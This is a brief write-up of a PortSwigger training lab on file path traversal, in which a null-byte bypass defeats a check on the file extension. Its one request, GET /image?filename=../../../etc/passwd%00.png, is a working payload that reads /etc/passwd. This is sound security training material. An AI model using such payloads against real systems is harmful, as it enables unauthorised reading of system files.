
# File path traversal, validation of file extension with null byte bypass

This lab contains a file path traversal vulnerability in the display of product images.

The application validates that the supplied filename ends with the expected file extension.

To solve the lab, retrieve the contents of the /etc/passwd file.

---------------------------------------------

References: 

- https://portswigger.net/web-security/file-path-traversal



![img](images/File%20path%20traversal,%20validation%20of%20file%20extension%20with%20null%20byte%20bypass/1.png)

---------------------------------------------


To retrieve an image the application uses a GET request with the parameter filename:



![img](images/File%20path%20traversal,%20validation%20of%20file%20extension%20with%20null%20byte%20bypass/2.png)

To retrieve /etc/passwd we need to use the null byte:

```
GET /image?filename=../../../etc/passwd%00.png
```



![img](images/File%20path%20traversal,%20validation%20of%20file%20extension%20with%20null%20byte%20bypass/3.png)